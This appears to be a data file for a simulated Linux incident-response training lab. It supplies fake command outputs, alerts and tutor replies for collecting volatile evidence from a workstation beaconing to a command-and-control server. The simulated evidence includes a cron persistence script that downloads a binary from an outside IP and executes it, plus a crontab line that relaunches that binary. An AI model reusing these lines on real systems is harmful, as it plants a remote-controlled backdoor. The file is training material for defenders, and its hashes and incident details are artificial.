// ─── FORENSICOS DFIR LAB — SIMULATED LINUX ENVIRONMENT ───────────────────────
// Workstation: ubuntu-ws-047 | User: j.hartley | Compromised 2026-11-14 ~03:40 UTC

export const WORKSTATION = {
  hostname: "ubuntu-ws-047",
  ip: "10.10.4.47",
  user: "j.hartley",
  os: "Ubuntu 22.04.3 LTS",
  kernel: "5.15.0-91-generic",
  incident: "INC-2026-C2-0312",
  c2ip: "185.220.101.93",
  malware: "syslogd-helper",
  compromised: "2026-11-14T03:41:22Z",
};

export const COMMANDS = {
  "date": {
    output: `Fri Nov 14 09:17:44 UTC 2026`,
    volatile: false,
    description: "Current system date/time — document as T0 timestamp",
    category: "timestamp",
    hash: "a3f8c2e1b9d4f5a7c8e2d1b3f4a5c6e7d8b9a0c1e2f3d4b5a6c7e8f9a0b1c2",
  },

  "ps aux": {
    output: `USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.1 168744  9216 ?        Ss   03:30   0:02 /sbin/init splash
root           2  0.0  0.0      0     0 ?        S    03:30   0:00 [kthreadd]
root         389  0.0  0.2  47424 18432 ?        Ss   03:30   0:01 /lib/systemd/systemd-journald
root         421  0.0  0.1  23880  9440 ?        Ss   03:30   0:00 /lib/systemd/systemd-udevd
root         612  0.0  0.2  17224 14336 ?        Ss   03:31   0:00 /usr/sbin/sshd -D
root         614  0.0  0.3  72440 24576 ?        Ss   03:31   0:01 /usr/sbin/rsyslogd -n -iNONE
root         618  0.0  0.0   9216  1024 ?        Ss   03:31   0:00 /usr/sbin/cron -f -P
j.hartley   1441  0.0  0.1  12288  8192 pts/0    Ss   08:52   0:00 -bash
j.hartley   1502  0.0  0.1  13312  9216 pts/1    Ss   08:54   0:00 -bash
j.hartley   1887  2.3  0.4  48640 32768 ?        Ss   03:41   5:12 /tmp/.cache/syslogd-helper -c 185.220.101.93 -p 4444 -d
j.hartley   1892  0.0  0.2  35840 16384 ?        S    03:41   0:44 /tmp/.cache/syslogd-helper -c 185.220.101.93 -p 4444 -d [worker]
root        2014  0.0  0.1  18432 10240 ?        Ss   04:12   0:00 /usr/sbin/atd -f
j.hartley   2241  0.1  0.3  58880 24576 ?        Sl   05:33   0:18 tmux: server
j.hartley   2242  0.0  0.1  12288  8192 pts/2    Ss   05:33   0:00 /bin/bash (tmux)
j.hartley   2380  0.0  0.1  12288  8192 pts/3    Ss+  06:01   0:00 /bin/bash (tmux)
root        3301  0.0  0.0   9216  2048 ?        S    08:00   0:00 /bin/sh -c /etc/cron.hourly/sys-update
root        3302  0.0  0.1  12288  4096 ?        S    08:00   0:00 /bin/bash /etc/cron.hourly/sys-update
j.hartley   4471  0.0  0.0   9728  1536 pts/0    R+   09:17   0:00 ps aux`,
    volatile: true,
    description: "Running processes — captures malware PID 1887 and suspicious tmux sessions",
    category: "processes",
    hash: "b7e4d2c9a1f8e3b5d6c4a2f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0",
    suspiciousLines: [1887, 1892, 2241, 2242, 2380, 3301, 3302],
  },

  "ss -tulpn": {
    output: `Netid  State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process
tcp    LISTEN  0       128     0.0.0.0:22          0.0.0.0:*          users:(("sshd",pid=612,fd=3))
tcp    LISTEN  0       128     [::]:22             [::]:*             users:(("sshd",pid=612,fd=4))
tcp    ESTAB   0       0       10.10.4.47:52841    185.220.101.93:4444  users:(("syslogd-helper",pid=1887,fd=5))
tcp    ESTAB   0       12288   10.10.4.47:52843    185.220.101.93:443   users:(("syslogd-helper",pid=1892,fd=7))
tcp    ESTAB   0       0       10.10.4.47:54129    10.10.4.1:22        users:(("sshd",pid=612,fd=8))
udp    UNCONN  0       0       127.0.0.53:53       0.0.0.0:*          users:(("systemd-resolved",pid=391,fd=13))`,
    volatile: true,
    description: "Active network sockets — confirms C2 beacons on ports 4444 and 443",
    category: "network",
    hash: "c9f1e3d5b7a9c1e3f5d7b9a1c3e5f7d9b1a3c5e7f9d1b3a5c7e9f1d3b5a7c9",
    suspiciousLines: [3, 4],
  },

  "netstat -antp": {
    output: `Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      612/sshd
tcp        0      0 10.10.4.47:52841        185.220.101.93:4444     ESTABLISHED 1887/syslogd-helper
tcp        0  12288 10.10.4.47:52843        185.220.101.93:443      ESTABLISHED 1892/syslogd-helper
tcp        0      0 10.10.4.47:54129        10.10.4.1:22            ESTABLISHED 612/sshd
tcp6       0      0 :::22                   :::*                    LISTEN      612/sshd`,
    volatile: true,
    description: "Network connections with PIDs — corroborates ss output, confirms syslogd-helper C2",
    category: "network",
    hash: "d2a4c6e8f0b2d4a6c8e0f2b4d6a8c0e2f4b6d8a0c2e4f6b8d0a2c4e6f8b0d2",
    suspiciousLines: [2, 3],
  },

  "who": {
    output: `j.hartley pts/0        2026-11-14 08:52 (10.10.4.201)
j.hartley pts/1        2026-11-14 08:54 (10.10.4.201)
j.hartley pts/2        2026-11-14 05:33 (:0)
j.hartley pts/3        2026-11-14 06:01 (:0)`,
    volatile: true,
    description: "Logged-in users — shows 4 sessions, 2 from internal IP, 2 from local display",
    category: "users",
    hash: "e5b8d1f4a7c0e3b6d9f2a5c8e1b4d7f0a3c6e9b2d5f8a1c4e7b0d3f6a9c2e5",
    suspiciousLines: [3, 4],
  },

  "w": {
    output: ` 09:17:44 up 5:47,  4 users,  load average: 2.31, 1.98, 1.87
USER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT
j.hartley pts/0    10.10.4.201      08:52    0.00s  0.18s  0.02s w
j.hartley pts/1    10.10.4.201      08:54   23:01   0.04s  0.04s -bash
j.hartley pts/2    :0               05:33    3:44m  0.12s  0.00s /bin/bash (tmux)
j.hartley pts/3    :0               06:01    3:16m  0.08s  0.00s /bin/bash (tmux)`,
    volatile: true,
    description: "Who + what running — load average 2.31 abnormally high for idle workstation",
    category: "users",
    hash: "f8c1e4a7d0b3f6c9e2a5d8b1f4c7e0a3d6b9f2c5e8a1d4b7f0c3e6a9d2b5f8",
    suspiciousLines: [1, 5, 6],
  },

  "arp -a": {
    output: `? (10.10.4.1) at 00:50:56:a7:12:3f [ether] on ens160
? (10.10.4.10) at 00:50:56:a7:44:ab [ether] on ens160
? (10.10.4.201) at 00:50:56:a7:88:cd [ether] on ens160
? (10.10.4.250) at 00:50:56:a7:ff:01 [ether] on ens160`,
    volatile: true,
    description: "ARP cache — maps IP to MAC on local subnet, useful for identifying attacker pivots",
    category: "network",
    hash: "a1c3e5f7b9d1a3c5e7f9b1d3a5c7e9f1b3d5a7c9e1f3b5d7a9c1e3f5b7d9a1",
    suspiciousLines: [],
  },

  "ip route": {
    output: `default via 10.10.4.1 dev ens160 proto dhcp src 10.10.4.47 metric 100
10.10.4.0/24 dev ens160 proto kernel scope link src 10.10.4.47
169.254.0.0/16 dev ens160 scope link metric 1000`,
    volatile: true,
    description: "Routing table — default gateway and subnet routing, check for injected routes",
    category: "network",
    hash: "b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4",
    suspiciousLines: [],
  },

  "cat /etc/resolv.conf": {
    output: `# This is /run/systemd/resolve/stub-resolv.conf managed by man:systemd-resolved(8).
# Do not edit.
nameserver 127.0.0.53
options edns0 trust-ad
search corp.internal`,
    volatile: false,
    description: "DNS resolver config — check for rogue nameservers injected by malware",
    category: "config",
    hash: "c7e9b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a3c5e7b9d1f3a5c7",
    suspiciousLines: [],
  },

  "lsof -i": {
    output: `COMMAND       PID      USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
sshd          612      root    3u  IPv4  14821      0t0  TCP *:ssh (LISTEN)
sshd          612      root    4u  IPv6  14822      0t0  TCP *:ssh (LISTEN)
sshd          612      root    8u  IPv4  18934      0t0  TCP ubuntu-ws-047:54129->10.10.4.1:ssh (ESTABLISHED)
syslogd-h    1887  j.hartley    5u  IPv4  22847      0t0  TCP ubuntu-ws-047:52841->185.220.101.93:4444 (ESTABLISHED)
syslogd-h    1892  j.hartley    7u  IPv4  22849      0t0  TCP ubuntu-ws-047:52843->185.220.101.93:https (ESTABLISHED)`,
    volatile: true,
    description: "Open files + network — confirms malware file handles, cross-references PIDs 1887/1892",
    category: "files",
    hash: "d0f2b4c6e8a0d2f4b6c8e0a2d4f6b8c0e2a4d6f8b0c2e4a6d8f0b2c4e6a8d0",
    suspiciousLines: [4, 5],
  },

  "lsof -p 1887": {
    output: `COMMAND       PID      USER   FD   TYPE    DEVICE SIZE/OFF      NODE NAME
syslogd-h    1887  j.hartley  cwd    DIR     8,1     4096   1835009 /tmp/.cache
syslogd-h    1887  j.hartley  exe    REG     8,1   184320   1835010 /tmp/.cache/syslogd-helper
syslogd-h    1887  j.hartley    0u   CHR     1,3      0t0         5 /dev/null
syslogd-h    1887  j.hartley    1u   CHR     1,3      0t0         5 /dev/null
syslogd-h    1887  j.hartley    2u   CHR     1,3      0t0         5 /dev/null
syslogd-h    1887  j.hartley    5u  IPv4   22847      0t0           TCP ubuntu-ws-047:52841->185.220.101.93:4444 (ESTABLISHED)
syslogd-h    1887  j.hartley    6r   REG     8,1   442368   1835012 /tmp/.cache/.config`,
    volatile: true,
    description: "Files opened by malware PID 1887 — reveals working dir /tmp/.cache and config file",
    category: "files",
    hash: "e3a5c7e9b1d3e5a7c9b1d3e5a7c9b1d3e5a7c9b1d3e5a7c9b1d3e5a7c9b1d3",
    suspiciousLines: [1, 2, 7, 8],
  },

  "ls -la /tmp/.cache": {
    output: `total 640
drwxr-x--- 2 j.hartley j.hartley   4096 Nov 14 03:41 .
drwxrwxrwt 9 root      root        4096 Nov 14 08:22 ..
-rwxr-x--- 1 j.hartley j.hartley 184320 Nov 14 03:41 syslogd-helper
-rwxr-x--- 1 j.hartley j.hartley  16384 Nov 14 03:41 syslogd-helper [worker]
-rw-r----- 1 j.hartley j.hartley 442368 Nov 14 03:41 .config
-rw-r----- 1 j.hartley j.hartley   1024 Nov 14 03:41 .pid`,
    volatile: false,
    description: "Malware staging directory — executables and config hidden in /tmp/.cache",
    category: "filesystem",
    hash: "f6b8d0a2c4f6b8d0a2c4f6b8d0a2c4f6b8d0a2c4f6b8d0a2c4f6b8d0a2c4f6",
    suspiciousLines: [3, 4, 5, 6],
  },

  "sha256sum /tmp/.cache/syslogd-helper": {
    output: `3a7f9c2e4b8d1f6a5e8c9d2f4b7e3a1c6d8f2b4e7a9c1f3e5b8d0a2c4f6b8d0  /tmp/.cache/syslogd-helper`,
    volatile: false,
    description: "Hash of malware binary — preserve for threat intel sharing and AV submission",
    category: "hash",
    hash: "a8c2e4f6b8d0a2c4e6f8b0d2a4c6e8f0b2d4a6c8e0f2b4d6a8c0e2f4b6d8a0",
    suspiciousLines: [1],
  },

  "crontab -l": {
    output: `# Edit this file to introduce tasks to be run by cron.
# m h  dom mon dow   command
*/5 * * * * /tmp/.cache/syslogd-helper -c 185.220.101.93 -p 4444 -d 2>/dev/null`,
    volatile: false,
    description: "User crontab — persistence mechanism re-launching malware every 5 minutes",
    category: "persistence",
    hash: "b1d3e5f7a9c1b3d5e7f9a1c3b5d7e9f1a3c5b7d9e1f3a5c7b9d1e3f5a7c9b1",
    suspiciousLines: [3],
  },

  "cat /etc/cron.hourly/sys-update": {
    output: `#!/bin/bash
# System maintenance update script
if [ ! -f /tmp/.cache/syslogd-helper ]; then
  curl -s http://185.220.101.93/update -o /tmp/.cache/syslogd-helper && chmod +x /tmp/.cache/syslogd-helper
fi
/tmp/.cache/syslogd-helper -c 185.220.101.93 -p 4444 -d &`,
    volatile: false,
    description: "Root-level persistence script — re-downloads and re-executes malware if killed",
    category: "persistence",
    hash: "c4e6f8b0d2c4e6f8b0d2c4e6f8b0d2c4e6f8b0d2c4e6f8b0d2c4e6f8b0d2c4",
    suspiciousLines: [4, 5, 6],
  },

  "last": {
    output: `j.hartley pts/0        10.10.4.201      Fri Nov 14 08:52   still logged in
j.hartley pts/1        10.10.4.201      Fri Nov 14 08:54   still logged in
j.hartley pts/0        10.10.4.201      Fri Nov 14 07:30 - 08:51  (01:21)
j.hartley pts/0        185.220.101.93   Fri Nov 14 03:41 - 04:15  (00:34)
j.hartley pts/0        10.10.4.201      Thu Nov 13 17:22 - 19:10  (01:48)

wtmp begins Mon Nov 10 09:00:01 2026`,
    volatile: true,
    description: "Login history — CRITICAL: external IP 185.220.101.93 logged in at 03:41 UTC (C2 IP!)",
    category: "users",
    hash: "d7f9b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a3c5e7b9d1f3a5c7",
    suspiciousLines: [4],
  },

  "dmesg | tail -20": {
    output: `[21482.441200] audit: type=1400 audit(1731552142.912:156): apparmor="ALLOWED" operation="exec" profile="unconfined" name="/tmp/.cache/syslogd-helper" pid=1887 comm="bash" requested_mask="x" denied_mask="" fsuid=1001 ouid=1001
[21482.441318] audit: type=1105 audit(1731552142.912:157): login pid=1887 uid=1001 subj=unconfined old-auid=4294967295 auid=1001 tty=(none) old-ses=4294967295 ses=4
[24891.224100] audit: type=1400 audit(1731555551.103:201): apparmor="ALLOWED" operation="connect" profile="unconfined" name="/tmp/.cache/syslogd-helper" pid=1887 comm="syslogd-helper" requested_mask="connect" denied_mask="" fsuid=1001 ouid=1001 laddr=10.10.4.47 lport=52841 faddr=185.220.101.93 fport=4444 family="inet" sock_type="stream" protocol=6`,
    volatile: true,
    description: "Kernel audit log — AppArmor entries showing malware exec and C2 connection events",
    category: "logs",
    hash: "e0b2d4f6a8e0b2d4f6a8e0b2d4f6a8e0b2d4f6a8e0b2d4f6a8e0b2d4f6a8e0",
    suspiciousLines: [1, 2, 3],
  },

  "uname -a": {
    output: `Linux ubuntu-ws-047 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux`,
    volatile: false,
    description: "Kernel and OS version — record for evidence documentation",
    category: "system",
    hash: "f3a5c7e9b1f3a5c7e9b1f3a5c7e9b1f3a5c7e9b1f3a5c7e9b1f3a5c7e9b1f3",
    suspiciousLines: [],
  },
  "ifconfig": {
    output: `ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.4.47  netmask 255.255.255.0  broadcast 10.10.4.255
        inet6 fe80::250:56ff:fea7:1234  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:a7:12:47  txqueuelen 1000  (Ethernet)
        RX packets 284731  bytes 312845120 (312.8 MB)
        TX packets 51423  bytes 142834688 (142.8 MB)

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)`,
    volatile: true,
    description: "Network interface configuration — confirms IP and MAC, check TX bytes for exfil",
    category: "network",
    hash: "a6c8e0b2d4a6c8e0b2d4a6c8e0b2d4a6c8e0b2d4a6c8e0b2d4a6c8e0b2d4a6",
    suspiciousLines: [6],
  },
};

export const VOLATILITY_ORDER = [
  { level: 1, label: "CPU Registers & Cache",     example: "Captured by memory dump tool only",         note: "Cannot capture via CLI commands" },
  { level: 2, label: "Routing Table / ARP Cache",  example: "arp -a, ip route",                        note: "Lost on NIC reset or reboot" },
  { level: 3, label: "Running Processes",           example: "ps aux",                                  note: "Lost when process terminates" },
  { level: 4, label: "Network Connections",         example: "ss -tulpn, netstat -antp, lsof -i",       note: "Lost when connection closes" },
  { level: 5, label: "Logged-in Users",             example: "who, w, last",                            note: "Lost on logout" },
  { level: 6, label: "Open Files / File Handles",   example: "lsof",                                    note: "Lost when process exits" },
  { level: 7, label: "System Date/Time",            example: "date",                                    note: "Document as investigation T0" },
  { level: 8, label: "Disk / Filesystem",           example: "ls, sha256sum, dd",                       note: "Survives reboot — lower volatility" },
  { level: 9, label: "Remote Logging / SIEM",       example: "Centralised syslog",                      note: "Most persistent" },
  { level:10, label: "Physical Media / Backups",    example: "External drive, cloud backup",            note: "Most persistent" },
];

export const ALERTS = [
  { id:"ALT-001", time:"09:14:52", sev:"critical", title:"C2 Beacon — 185.220.101.93:4444", detail:"Outbound TCP ESTABLISHED to known BlackMatter C2 node. OVH Romania. AbuseIPDB confidence 94%.", host:"ubuntu-ws-047", rule:"C2-BEACON-007" },
  { id:"ALT-002", time:"09:14:53", sev:"critical", title:"Suspicious binary in /tmp — syslogd-helper", detail:"Process spawned from /tmp/.cache/ masquerading as system logger. Not in package registry.", host:"ubuntu-ws-047", rule:"PROC-TEMP-001" },
  { id:"ALT-003", time:"09:14:55", sev:"high",     title:"Unusual outbound HTTPS to C2 IP", detail:"Second connection from same process on port 443. Likely exfiltration channel.", host:"ubuntu-ws-047", rule:"EXFIL-HTTPS-003" },
  { id:"ALT-004", time:"09:15:01", sev:"high",     title:"External login from C2 IP at 03:41 UTC", detail:"Login session from 185.220.101.93 appears in wtmp. Matches malware drop timestamp.", host:"ubuntu-ws-047", rule:"AUTH-EXTERNAL-002" },
  { id:"ALT-005", time:"09:15:04", sev:"medium",   title:"Cron persistence mechanism detected", detail:"User crontab contains entry executing binary from /tmp. Restarts every 5 minutes.", host:"ubuntu-ws-047", rule:"PERSIST-CRON-001" },
  { id:"ALT-006", time:"09:15:08", sev:"medium",   title:"Unauthorised tmux sessions active", detail:"2 tmux sessions with no associated terminal. Possible attacker persistent shell.", host:"ubuntu-ws-047", rule:"SESS-TMUX-001" },
];

export const BYTE_RESPONSES = {
  welcome: `<p>I'm <b>Byte</b> — your DFIR AI guide. 🔍</p><p>You're investigating a <b>C2 beacon alert</b> on workstation <code>ubuntu-ws-047</code>. The machine is live and the malware is running.</p><p><b>Your mission:</b> collect volatile evidence in the correct order before containment. Follow RFC 3227 — most volatile data first.</p><p>Ask me anything: commands to run, what evidence means, or what to do next.</p>`,

  "order of volatility": `<p><b>RFC 3227 — Order of Volatility:</b></p><p>Collect evidence from <b>most volatile</b> (lost on reboot) to <b>least volatile</b> (survives reboot):</p><p>1. CPU/memory (live dump tool)<br/>2. ARP cache &amp; routing tables<br/>3. Running processes<br/>4. Network connections<br/>5. Logged-in users<br/>6. Open files<br/>7. System date/time<br/>8. Disk/filesystem (sha256sum)<br/>9. Persistent logs</p><p>Starting with disk when RAM data exists loses the most valuable evidence.</p>`,

  "what is c2": `<p><b>Command &amp; Control (C2):</b></p><p>The malware on this host is beaconing to <code>185.220.101.93</code> — a server the attacker controls. This lets them:</p><p>• Issue commands to the compromised host<br/>• Exfiltrate data<br/>• Download additional payloads<br/>• Maintain persistence</p><p>Run <code>ss -tulpn</code> or <code>netstat -antp</code> to confirm the active connection before it drops.</p>`,

  "where is malware": `<p><b>Malware Location Clues:</b></p><p>The process is named <code>syslogd-helper</code> — it's masquerading as a legitimate system logger. Look in:</p><p>• <code>ps aux</code> — find the suspicious PID<br/>• <code>ls -la /tmp/.cache/</code> — malware staging area<br/>• <code>lsof -p [PID]</code> — see what files it has open</p><p>⚠️ Don't kill it yet — collect all volatile evidence first!</p>`,

  "what to collect first": `<p><b>Start here (most volatile):</b></p><p>1. <code>date</code> — document investigation start time<br/>2. <code>ps aux</code> — capture running processes NOW<br/>3. <code>ss -tulpn</code> — active connections (C2 beacon)<br/>4. <code>who</code> / <code>w</code> — logged-in users<br/>5. <code>arp -a</code> — ARP cache<br/>6. <code>ip route</code> — routing table<br/>7. <code>lsof -i</code> — open network files</p><p>Each command output should be saved to a timestamped file and hashed immediately.</p>`,

  "persistence": `<p><b>Persistence Mechanisms Found:</b></p><p>Two persistence methods identified:</p><p><b>User crontab:</b> <code>crontab -l</code> shows entry running malware every 5 minutes</p><p><b>Root cron script:</b> <code>/etc/cron.hourly/sys-update</code> re-downloads and re-runs the malware if killed</p><p>This means simply killing the process isn't enough — both cron entries must be removed, and the malware binary must be deleted, before containment is complete.</p>`,

  "how to hash": `<p><b>Hashing Evidence Files:</b></p><p>After saving command output, hash it immediately:</p><p><code>sha256sum filename.txt</code></p><p>Record the hash in your evidence log alongside the filename and timestamp. This creates a chain of custody — proving the file hasn't been modified since collection.</p><p>The NexusForensic platform does this automatically when you click <b>Save &amp; Hash</b> on any terminal output.</p>`,

  "tmux sessions": `<p><b>Suspicious tmux Sessions:</b></p><p><code>ps aux</code> shows tmux sessions on pts/2 and pts/3 that aren't associated with normal logins. This could be:</p><p>• Attacker maintaining persistent shell sessions<br/>• Automated scripts running in background<br/>• Lateral movement staging</p><p>Check what's running inside: <code>tmux list-sessions</code> and <code>tmux list-windows</code>. Document before killing.</p>`,

  "default": `<p>I can help with:</p><p>• <b>Commands to run</b> — ask "what command shows network connections?"<br/>• <b>What evidence means</b> — ask "what is the C2 IP?"<br/>• <b>Volatility order</b> — ask "order of volatility"<br/>• <b>Malware analysis</b> — ask "where is malware?" or "persistence"<br/>• <b>Evidence collection</b> — ask "how to hash" or "what to collect first"</p>`,
};

export const PHASE_STEPS = [
  { id:1, phase:"Document T0", cmd:"date",                          desc:"Record investigation start timestamp", req:true },
  { id:2, phase:"Processes",   cmd:"ps aux",                        desc:"Capture all running processes",        req:true },
  { id:3, phase:"Network",     cmd:"ss -tulpn",                     desc:"Active network connections",           req:true },
  { id:4, phase:"Network",     cmd:"netstat -antp",                 desc:"Connections with PID mapping",         req:false },
  { id:5, phase:"Users",       cmd:"who",                           desc:"Currently logged-in users",            req:true },
  { id:6, phase:"Users",       cmd:"w",                             desc:"Users with process details",           req:false },
  { id:7, phase:"Network",     cmd:"arp -a",                        desc:"ARP cache (local subnet)",             req:true },
  { id:8, phase:"Network",     cmd:"ip route",                      desc:"Routing table",                        req:true },
  { id:9, phase:"Login Hist",  cmd:"last",                          desc:"Login history (wtmp)",                 req:true },
  { id:10,phase:"Open Files",  cmd:"lsof -i",                       desc:"Open network file handles",            req:true },
  { id:11,phase:"Malware",     cmd:"lsof -p 1887",                  desc:"Files opened by malware process",      req:false },
  { id:12,phase:"Filesystem",  cmd:"ls -la /tmp/.cache",            desc:"Malware staging directory",            req:true },
  { id:13,phase:"Persistence", cmd:"crontab -l",                    desc:"User persistence mechanisms",          req:true },
  { id:14,phase:"Hash",        cmd:"sha256sum /tmp/.cache/syslogd-helper", desc:"Hash malware binary",           req:true },
];
